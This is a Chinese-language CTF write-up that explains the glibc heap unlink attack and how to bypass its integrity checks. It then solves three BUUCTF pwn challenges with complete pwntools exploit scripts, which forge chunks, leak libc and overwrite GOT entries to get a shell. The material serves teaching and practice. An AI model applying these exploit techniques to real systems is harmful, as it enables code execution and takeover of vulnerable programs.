# Unlink

## 原理

1. 我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。
2. 简单回顾一下 unlink 的目的与过程，其目的是把**一个双向链表**中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下:

![image-20240713185855252](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407131858334.png)

下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。

## 古老的unlink：

1. 在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码:

   ```c
   // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
   if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
         malloc_printerr ("corrupted size vs. prev_size");               \
   // 检查 fd 和 bk 指针(双向链表完整性检查)
   if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
     malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
   
     // largebin 中 next_size 双向链表完整性检查 
                 if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                   || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
                 malloc_printerr (check_action,                                      \
                                  "corrupted double-linked list (not small)",    \
                                  P, AV);
   ```

2. 这里我们以 **32 位为例**，假设堆内存最初的布局是下面的样子:

   ![image-20240718193438926](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181934114.png)

   1. 现在有**物理空间连续**的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于**释放状态**。那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 **fd（target addr -12 ）** 和 **bk（expect value ）** 指针值修改为指定的值。则当我们 **free(Q)** 时:

   * glibc 判断这个块是 **small chunk**
   * 判断**前向合并**，发现前一个 chunk 处于使用状态，不需要前向合并
   * 判断**后向合并**，发现后一个 chunk 处于空闲状态，需要合并
   * 继而对 **Nextchunk** 采取 unlink 操作

   2. 那么 **unlink 具体执行**的效果是什么样子呢？我们可以来分析一下:

   * FD = P->fd = target addr -12 	【索引到**Nextchunk的下一个chunk**】
   * BK = P->bk = expect value            【索引到**Nextchunk的上一个chunk**】
   * **FD->bk = BK**，即 *(target addr-12+12)=BK= **expect value** (**成功将目标地址target addr的值改为expect value**)           【**下一个chunk的bk**值，要等于Nextchunk的上一个chunk地址】
   * **BK->fd = FD**，即 *(expect value +8) = FD = target addr-12          【**上一个chunk的fd**值，要等于Nextchunk的下一个chunk地址】

   3. 看起来我们似乎可以通过 unlink 直接实现**任意地址读写**的目的，但是我们还是需要确保 **expect value +8 地址** （去掉chunk的头，32位的头大小为8bit）具有 **可写的权限** 。 

      比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。**需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。**

## 当前的 unlink:

1. 但是，现实是残酷的。我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 **fd 和 bk 的检查** :(释放**free前**的检查)

   ```c
   // fd bk
   if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
     malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
   ```

   此时:

   - FD->bk = target addr - 12 + 12=target_addr
   - BK->fd = expect value + 8

   那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式**绕过这个机制**。

   首先我们通过覆盖，将 nextchunk 的 **FD 指针指向了 fakeFD**，将 nextchunk 的 **BK 指针指向了 fakeBK** 。那么为了通过验证，我们需要:（先检查，后unlink）

   * `fakeFD -> bk == P` <=> `*(fakeFD + 12) == P` 
   * `fakeBK -> fd == P` <=> `*(fakeBK + 8) == P ` 

   当**满足上述两式**时，可以进入 Unlink 的环节，进行如下操作：

   - `fakeFD -> bk = fakeBK` <=> `*(fakeFD + 12) = fakeBK` 
   - `fakeBK -> fd = fakeFD` <=> `*(fakeBK + 8) = fakeFD`

   ![image-20240713201826299](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407132018536.png)

   如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：

   - `*P = P - 8` 
   - `*P = P - 12` 

   即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以**修改指向 chunk 的指针**，这样的修改是可以达到一定的效果的。

   如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：

   ![image-20240713203135215](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181936819.png)

   需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。

   ```c
       // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
       if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
         malloc_printerr ("corrupted size vs. prev_size");               \
   ```

   此外，其实如果我们设置 next chunk 的 **fd 和 bk** 均为 **nextchunk 的地址**也是可以绕过上面的检测的。但是这样的话，并**不能达到修改指针内容**的效果。

## 利用思路：

### 条件：

1. UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针。
2. 已知位置**存在一个指针指向可进行 UAF 的 chunk** 。

### 效果

1. 使得已指向 UAF chunk 的**指针 ptr 变为 ptr - 0x18** 。

### 思路：

1. 设指向可 UAF chunk 的**指针的地址** （就是指针的地址，而不是指针指向的地址）为 **ptr** ：
   * 修改 fd 为 ptr - 0x18
   * 修改 bk 为 ptr - 0x10
   * 绕过检测，并触发 unlink
   * **ptr 处的指针会变为 ptr - 0x18** 。



## 例题1：

题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcon2014_stkof)

### 思路：

1. 使用unlink申请到heaplist附近的堆，再修改heaplist指向下一个chunk，**创造傀儡**。
2. 利用**傀儡hook掉strlen函数**，指向puts函数的plt表，这样strlen就能输出内容，便于后面泄漏libc基地址。
3. 利用**傀儡任意地址读数据**，泄漏puts函数的got值，获取libc基地址。
4. 利用**傀儡任意地址写数据**，hook掉free函数的got表，指向system函数。
5. 最后free一个chunk内容为b"/bin/sh\x00"的chunk，直接getshell。

### 分析：

函数分析后执行命名：

1. add函数，能添加指定大小的chunk：

   ![image-20240718120728725](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181207799.png)

2. edit函数，指定输入的size大小，存在堆溢出(我们只需要溢出一个字节即可)：

   ![image-20240718120844942](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181208010.png)

3. delete函数，清空了堆指针，没有UAF漏洞：

   ![image-20240718193409979](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181934086.png)

4. show函数，没有输出chunk中的内容，所以要hook函数strlen，来获取输出（堆指针指向的位置）：

   ![image-20240718193400063](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181934172.png)

### 利用：

1. 先构造unlink，利用heaplist中存储的指向chunk2的指针，来绕过检查，将fd值写入到**bk+0x10地址**：

   ```python
   add(0x10)   #1  没用
   add(0x20)   #2  构造unlink
   add(0x80)   #3  触发unlink
   add(0x10)   #4  防止合并
   add(0x10)   #5 最后free，getshell
   edit(5,b"/bin/sh\x00")   #最后free，getshell
   
   #构造unlink
   heap_list = 0x602150
   fd = heap_list-0x18
   bk = heap_list-0x10
   content = p64(fd)+p64(bk)
   size = 0x21
   prve_size = 0x20
   next_size = 0x90
   payload2 = p64(0) + p64(size) + content + p64(prve_size)+p64(next_size)
   edit(2,payload2)
   #触发unlink
   free(3)
   ```

   ![image-20240718121642587](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181216699.png)

2. 创建傀儡chunk，chunk4作为傀儡：

   ```python
   #利用unlink，创造傀儡chunk4，通过chunk2控制傀儡
   new_addr = 0x602160
   payload2 = p64(0)*3 + p64(new_addr)
   edit(2,payload2)
   ```

   ![image-20240718121952215](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181219321.png)

3. 利用傀儡，hook掉strlen函数，指向puts函数的plt表：

   ```python
   #利用傀儡，先用puts函数hook掉strlen函数
   payload2 = p64(elf.got["strlen"])     #写入strlen函数的got表
   edit(2,payload2)
   
   payload4 = p64(elf.plt["puts"])       #修改strlen函数的got表
   edit(4,payload4)
   ```

   ![image-20240718122215835](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181222962.png)

4. 继续利用傀儡，泄漏puts函数的got表，从而获取libc基地址：

   ```python
   #利用傀儡，泄漏puts函数的got表，泄漏libc基地址
   payload2 = p64(elf.got["puts"])     #写入puts函数的got表
   edit(2,payload2)
   
   show(4)     #输出puts函数got表的内容
   #获取libc基地址
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = puts_addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   success("system_addr==>"+hex(sys_addr))
   ```

   ![image-20240718122440300](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181224472.png)

5. 继续利用傀儡，hook掉free函数的got表，改为system函数地址，最后free掉chunk5即可getshell:

   ```python
   #继续利用傀儡，hook掉free函数的got表，改为system函数地址
   payload2 = p64(elf.got["free"])     #写入strlen函数的got表
   edit(2,payload2)
   
   payload4 = p64(sys_addr)       #修改free函数的got表
   edit(4,payload4)
   # debug()
   free(5)
   p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240718193345268](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181933542.png)

6. 完整的EXP:

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node5.buuoj.cn",28221)
   p = process("./pwn")
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
   elf = ELF("./pwn")
   
   def add(size):
       p.sendline(b'1')
       p.sendline(str(size))
   
   def edit(index, content):
       p.sendline(b'2')
       p.sendline(str(index).encode())
       p.sendline(str(len(content)))
       p.sendline(content)
   
   def show(index):
       p.sendline(b'4')
       p.sendline(str(index).encode())
   
   def free(index):
       p.sendline(b'3')
       p.sendline(str(index).encode())
   
   #unlink实现任意地址写，hook下strlen函数的got表用来泄漏libc，再hook一下free的got去getshell
   
   add(0x10)   #1  没用
   add(0x20)   #2  构造unlink
   add(0x80)   #3  触发unlink
   add(0x10)   #4  防止合并
   add(0x10)   #5 最后free，getshell
   edit(5,b"/bin/sh\x00")   #最后free，getshell
   
   #构造unlink
   heap_list = 0x602150
   fd = heap_list-0x18
   bk = heap_list-0x10
   content = p64(fd)+p64(bk)
   size = 0x21
   prve_size = 0x20
   next_size = 0x90
   payload2 = p64(0) + p64(size) + content + p64(prve_size)+p64(next_size)
   edit(2,payload2)
   
   
   #触发unlink
   free(3)
   
   #利用unlink，创造傀儡chunk4，通过chunk2控制傀儡
   new_addr = 0x602160
   payload2 = p64(0)*3 + p64(new_addr)
   edit(2,payload2)
   
   
   #利用傀儡，先用puts函数hook掉strlen函数
   payload2 = p64(elf.got["strlen"])     #写入strlen函数的got表
   edit(2,payload2)
   
   payload4 = p64(elf.plt["puts"])       #修改strlen函数的got表
   edit(4,payload4)
   
   #利用傀儡，泄漏puts函数的got表，泄漏libc基地址
   payload2 = p64(elf.got["puts"])     #写入puts函数的got表
   edit(2,payload2)
   
   show(4)     #输出puts函数got表的内容
   #获取libc基地址
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = puts_addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   success("system_addr==>"+hex(sys_addr))
   
   #继续利用傀儡，hook掉free函数的got表，改为system函数地址
   payload2 = p64(elf.got["free"])     #写入strlen函数的got表
   edit(2,payload2)
   
   payload4 = p64(sys_addr)       #修改free函数的got表
   edit(4,payload4)
   debug()
   
   free(5)
   p.sendline(b"cat flag")
   p.interactive()
   ```

   成功拿到flag：

   ![image-20240718122855514](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181228664.png)






## 例题2

题目地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#zctf2016_note2)

### 思路：

#### unlink的思路：（只讲unlink的思路）

1. 申请一个大小为0的chunk，系统会返回size为0x21的chunk，此时会存在堆溢出。
2. 再申请两个chunk，0x30，0x80，用来伪造unlink，和触发unlink。
3. 利用unlink修改heaplist指针，创建傀儡chunk。
4. 利用**傀儡任意地址读数据**，泄漏puts函数的got值，获取libc基地址。
5. 利用**傀儡任意地址写数据**，hook掉free函数的got表，指向system函数。
6. 最后free一个chunk内容为b"/bin/sh\x00"的chunk，直接getshell。

#### 利用堆溢出，fast attack思路：

1. 申请一个大小为0的chunk，系统会返回size为0x21的chunk，此时会存在堆溢出。
2. 释放一个chunk，修改其fd指针，申请伪造的chunk，溢出后覆盖heaplist。
3. 现在都有，任意地址写和任意地址读数据，泄漏libc，hook掉free函数got表，进而getshell。

### 分析：

1. add函数中自定义的read函数，当size为0时，无符号比较-1会一致比i大，但是当申请一个**为0的大小**，系统会返回**size为0x21的chunk** ，所以会造成堆溢出：

   ![image-20240718165817469](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181658559.png)

2. delete函数，堆指针清0，没有UAF：

   ![image-20240718165929758](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181659841.png)

3. show函数，打印堆指针处的数据，利用它来泄漏libc基地址：

   ![image-20240718165957049](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181659119.png)

4. edit函数，同样使用了自定义的read函数，但是无论是strncat函数还是strcpy函数，都会以b"\x00"结尾，所以edit函数**不能输入类似于p64(0)**的数据，只有**add函数能输入**：

   ![image-20240718170036756](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181700853.png)

### 利用：

1. 先构造unlink，利用heaplist中存储的指向chunk1的指针，来绕过检查，将fd值写入到**bk+0x10地址** ，因为edit函数不能输入p64(0)，所以采取 **先申请add(0,b"a")占位，再释放，再申请add(0,payload0)** 的方式将构造的unlink写入：

   ```python
   p.sendline(b"lzl")
   p.sendline(b"lzl")
   #unlink实现任意地址写，泄漏puts函数地址进而泄漏libc基地址，再hook一下free的got去getshell
   add(0,b'a')      #0  先占位
   add(0x20,b'a')   #1  构造unlink
   add(0x80,b'a')   #2  触发unlink
   
   #构造unlink
   heap_list = 0x602128
   fd = heap_list-0x18
   bk = heap_list-0x10
   content = p64(fd)+p64(bk)
   size = 0x21
   prve_size = 0x20
   next_size = 0x90
   payload0 = b"/bin/sh\x00" + p64(0)*2 +p64(0x31) + p64(0) + p64(size) + content + p64(prve_size)+p64(next_size)
   
   free(0)
   add(0,payload0)     #4 溢出修改chunk1伪造unlink，申请到先前释放dechunk0
   #触发unlink
   free(2)
   ```

   ![image-20240718170849409](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181708564.png)

   ![](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181711450.png)

2. 利用unlink，创造傀儡chunk2，通过chunk1控制傀儡chunk2：

   ```python
   #利用unlink，创造傀儡chunk2，通过chunk1控制傀儡
   new_addr = 0x602130
   payload2 = b"a"*8*3 + p64(new_addr)	#这里必须用b"a"填充，用p64(0)会输入不进去
   edit(1,payload2)
   ```

   ![image-20240718193308521](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181933759.png)

3. 往傀儡中写入**puts函数的got表地址**，输出泄漏**puts函数地址**，进而**泄漏libc基地址**：

   ```python
   #利用傀儡，泄漏puts函数的got表，泄漏libc基地址
   payload2 = p64(elf.got["puts"])     #写入puts函数的got表
   edit(1,payload2)
   show(2)     #输出puts函数got表的内容
   
   #获取libc基地址
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = puts_addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   success("system_addr==>"+hex(sys_addr))
   ```

   ![image-20240718193255412](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181932703.png)

4. 继续利用傀儡，hook掉free函数的got表，改为system函数地址：

   ```python
   payload2 = p64(elf.got["free"])     #写入strlen函数的got表
   edit(1,payload2)
   
   payload4 = p64(sys_addr)       #修改free函数的got表
   edit(2,payload4)
   
   #现在只有chunk3能使用（也是chunk0），前面已经向chunk0写入b"/bin/sh\x00"
   free(3)
   p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240718172053034](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181720127.png)

## 例题3

### 思路：

1. 和前面那一题一样的漏洞，但是show函数名存实亡，所以再unlink后泄漏libc地址时，需要先用puts函数plt地址来hook一下free函数，进而输出puts函数的地址 ==> 得到libc基地址。
2. 然后就是edit函数能直接写入b"\x00"了。
3. 后续利用方式于上题相同。

当然这题也可以用 **堆溢出+fast attack** 来做。

### 分析：

1. add函数中自定义的read函数，当size为0时，无符号比较-1会一致比i大，但是当申请一个**为0的大小**，系统会返回**size为0x21的chunk** ，所以会造成堆溢出：

   ![image-20240718191415913](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181914995.png)

2. show函数，名存实亡：

   ![image-20240718191432686](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181914754.png)

3. delete函数，任然没有UAF：

   ![image-20240718191449652](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181914742.png)

4. edit函数，写入的时候于add函数中的调用相同，相比于上一题使用strcat，这次能写入b"\x00"：

   ![image-20240718191505911](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181915995.png)

### 利用：

1. 利用heaplist伪造unlink，与上体相同：

   ```python
   add(0,b'a')      #0  溢出修改chunk2
   add(0x20,b'a')   #1  构造unlink
   add(0x80,b'a')   #2  触发unlink
   add(0x10,b"a")   #3  防止合并
   
   #构造unlink
   heap_list = 0x6020d0    #存放伪造unlink地址的heaplist地址
   fd = heap_list-0x18
   bk = heap_list-0x10
   content = p64(fd)+p64(bk)
   size = 0x21
   prve_size = 0x20
   next_size = 0x90
   payload0 =  p64(0)*3 +p64(0x31) + p64(0) + p64(size) + content + p64(prve_size)+p64(next_size)
   
   edit(0,payload0)
   #触发unlink
   free(2)
   ```

2. 泄漏libc地址，由于没有show函数，所以利用free函数来输出 ==> 用puts函数的plt地址覆盖掉free函数got表中的值，然后再修改亏chunk中的值为puts函数的got表地址，free掉傀儡chunk得到puts函数地址，进而获得libc基地址：

   ```python
   #利用傀儡，泄漏puts函数的got表，泄漏libc基地址
   payload1 = p64(elf.got["free"])     #写入free函数的got表,
   edit(1,payload1)
   
   payload2 = p64(elf.plt["puts"])[0:7] #用puts函数的plt地址hook掉，这里只西药7位，给8位时edit后会将got表的下一项最低为赋值为0，hi报错
   edit(2,payload2)
   payload1 = p64(elf.got["puts"])     #写入puts函数的got表,后续free输出泄漏
   edit(1,payload1)
   free(2)
   #获取libc基地址
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = puts_addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   success("system_addr==>"+hex(sys_addr))
   ```

   ![image-20240718192319557](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181923750.png)

   ![image-20240718192523139](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181925324.png)

3. 最后，用system函数的地址hook掉free函数的got表项，free掉一个指向b"/bin/sh\x00"的指针，即可getshell：

   ```python
   #继续利用傀儡，hook掉free函数的got表，改为system函数地址
   payload2 = p64(elf.got["free"])     #写入strlen函数的got表
   edit(1,payload2)
   
   payload4 = p64(sys_addr)[0:7]      #修改free函数的got表
   edit(2,payload4)
   
   edit(3,b"/bin/sh\x00")
   free(3)
   p.sendline(b"cat flag")
   p.interactive()
   ```

4. 完整EXP：

   ```python
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node5.buuoj.cn",26686)
   p = process("./pwn")
   libc = ELF('/home/kali/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
   elf = ELF("./pwn")
   
   def add(size,content):
       p.sendlineafter(b'>',b'1')
       p.sendline(str(size).encode())
       p.sendline(content)
   
   def edit(index, content):
       p.sendlineafter(b'>',b'3')
       p.sendlineafter(b":\n",str(index).encode())
       p.sendlineafter(b":",content)
   
   # def show(index):
       # p.sendlineafter(b'>',b'2')
       # p.sendline(str(index).encode())
   
   def free(index):
       p.sendlineafter(b'>',b'4')
       p.sendline(str(index).encode())
   
   add(0,b'a')      #0  溢出修改chunk2
   add(0x20,b'a')   #1  构造unlink
   add(0x80,b'a')   #2  触发unlink
   add(0x10,b"a")   #3  防止合并
   
   #构造unlink
   heap_list = 0x6020d0    #存放伪造unlink地址的heaplist地址
   fd = heap_list-0x18
   bk = heap_list-0x10
   content = p64(fd)+p64(bk)
   size = 0x21
   prve_size = 0x20
   next_size = 0x90
   payload0 =  p64(0)*3 +p64(0x31) + p64(0) + p64(size) + content + p64(prve_size)+p64(next_size)
   
   edit(0,payload0)
   # debug()
   #触发unlink
   free(2)
   
   #利用unlink，创造傀儡chunk2，通过chunk1控制傀儡chunk2
   new_addr = 0x6020d8
   payload1 = p64(0)*3 + p64(new_addr)
   edit(1,payload1)
   
   #利用傀儡，泄漏puts函数的got表，泄漏libc基地址
   payload1 = p64(elf.got["free"])     #写入free函数的got表,
   edit(1,payload1)
   
   payload2 = p64(elf.plt["puts"])[0:7] #用puts函数的plt地址hook掉
   edit(2,payload2)
   
   payload1 = p64(elf.got["puts"])     #写入puts函数的got表,后续free输出泄漏
   edit(1,payload1)
   debug()
   free(2)
   #获取libc基地址
   puts_addr = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
   libc_base = puts_addr - libc.symbols['puts']
   sys_addr = libc_base + libc.symbols['system']
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   success("system_addr==>"+hex(sys_addr))
   
   #继续利用傀儡，hook掉free函数的got表，改为system函数地址
   payload2 = p64(elf.got["free"])     #写入strlen函数的got表
   edit(1,payload2)
   
   payload4 = p64(sys_addr)[0:7]      #修改free函数的got表
   edit(2,payload4)
   
   edit(3,b"/bin/sh\x00")
   # debug()
   free(3)
   
   p.sendline(b"cat flag")
   p.interactive()
   ```

   成功拿到flag：

   ![image-20240718192933518](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407181932214.png)
